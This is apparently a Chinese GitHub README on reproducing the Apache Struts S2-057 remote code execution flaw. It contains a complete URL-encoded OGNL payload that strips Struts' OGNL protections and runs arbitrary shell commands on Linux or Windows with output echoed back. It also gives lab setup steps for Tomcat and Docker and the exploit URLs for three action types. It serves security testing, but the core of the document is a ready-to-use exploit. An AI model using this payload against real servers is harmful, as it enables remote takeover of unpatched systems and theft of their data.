# S2-057本地测试与复现

FN@悬镜安全实验室

## POC

测试发现结合S2-045构造的POC堪称完美，linux和windows通用，应该可执行任意命令，返回格式舒服且无乱码，当然是根据各位大佬的poc自行测试构造的，适用于Struts 2.3.34，而Struts 2.5.16的poc还没测试成功，等大佬们的poc吧

```
$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
```

注意：/不能编码为%2f，这个坑了好久，tomcat的原因

## 漏洞环境

war包：

https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip

https://archive.apache.org/dist/struts/2.3.34/struts-2.3.34-all.zip 

其中的struts2-showcase.war，当然这里也提供了对应的war包

- windows

tomcat+war即可

修改对应的\WEB-INF\classes\struts-actionchaining.xml

原：

```
<struts>
	<package name="actionchaining" extends="struts-default" namespace="/actionchaining">
		<action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
			<result type="chain">actionChain2</result>		
		</action>
		<action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">
			<result type="chain">actionChain3</result>
		</action>
		<action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">
			<result>/WEB-INF/actionchaining/actionChainingResult.jsp</result>
		</action>
	</package>
</struts>
```

修改为：

```
<struts>
	<package name="actionchaining" extends="struts-default">
		<action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
			<result type="redirectAction">
				<param name = "actionName">register2</param>
			</result>
		</action>
		<action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">
			<result type="chain">xxx</result>
		</action>
		<action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">
			<result type="postback">
				<param name = "actionName">register2</param>
			</result>
		</action>
	</package>
</struts>
```

访问：

http://localhost:8080/S2-057-2-5-16/${(111+111)}/actionChain1.action

http://localhost:8080/S2-057-2-3-34/${(111+111)}/actionChain1.action

跳转并计算表达式，漏洞环境搭建成功

- linux

使用p牛的vulhub，当然需要修改配置。

https://github.com/vulhub/vulhub/tree/master/struts2/s2-015

需要修改Dockerfile和拷贝相应war文件和xml文件

```
COPY S2-057-2-3-34.war /usr/local/tomcat/webapps/S2-057-2-3-34.war
COPY S2-057-2-5-16.war /usr/local/tomcat/webapps/S2-057-2-5-16.war
COPY vul.xml /usr/local/tomcat/webapps/struts-actionchaining.xml
```

启动：docker-compose up -d

然后需要进入docker

docker ps

docker exec -i -t [CONTAINER_ID] /bin/bash

docker内执行：

```
cd /usr/local/tomcat/webapps
cp struts-actionchaining.xml S2-057-2-3-34/WEB-INF/classes/struts-actionchaining.xml
#cp struts-actionchaining.xml S2-057-2-3-34/WEB-INF/src/java/struts-actionchaining.xml
cp struts-actionchaining.xml S2-057-2-5-16/WEB-INF/classes/struts-actionchaining.xml
#cp struts-actionchaining.xml S2-057-2-5-16/WEB-INF/src/java/struts-actionchaining.xml
cd /usr/local/tomcat/bin
./shutdown.sh
```

会自动退出docker，然后再次docker-compose up -d，不能docker-compose down，不然得重新进入docker配置

访问

http://IP:8080/S2-057-2-3-34/$%7B(111+111)%7D/actionChain1.action

http://IP:8080/S2-057-2-5-16/$%7B(111+111)%7D/actionChain1.action

跳转并计算表达式说明搭建成功

注意：

如果需要重新创建容器，需要先删除相应的镜像

docker images

docker rmi image_id


## 漏洞复现

只提供了windows下的部分截图，linux也复现成功了的，不过未再提供截图

1.Redirect action

http://HOST/S2-057-2-3-34/POC/actionChain1.action

表达式验证在返回头Location里，poc命令执行回显在body里

![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Redirect-dir.jpg)

2.Chain action

http://HOST/S2-057-2-3-34/POC/actionChain2.action

无回显，无跳转，应该是xml中该action配置的原因，命令执行成功，回显在body里

![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Chain-dir.jpg)

3.Postback action

http://HOST/S2-057-2-3-34/POC/actionChain3.action

验证和回显都在body，form的形式

![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Postback-echo.jpg)

## 参考

[S2-057 远程命令执行漏洞复现](https://mp.weixin.qq.com/s/H6bLuXS8qCVRh1mSgAkdXQ)

[S2-057技术分析](https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483698&idx=1&sn=1b79bb4bd7d5b1173043d0c5c8335320)

[【Struts2-代码执行漏洞分析系列】S2-057](https://xz.aliyun.com/t/2618)

https://github.com/jas502n/St2-057

https://lgtm.com/blog/apache_struts_CVE-2018-11776

## TODO

1. Struts 2.5.16 poc
2. 其他版本测试
3. 通用检测脚本，发现有的脚本只检测了Redirect action的情况，看大佬们的介绍应该还存在其他情况
4. 实际测试
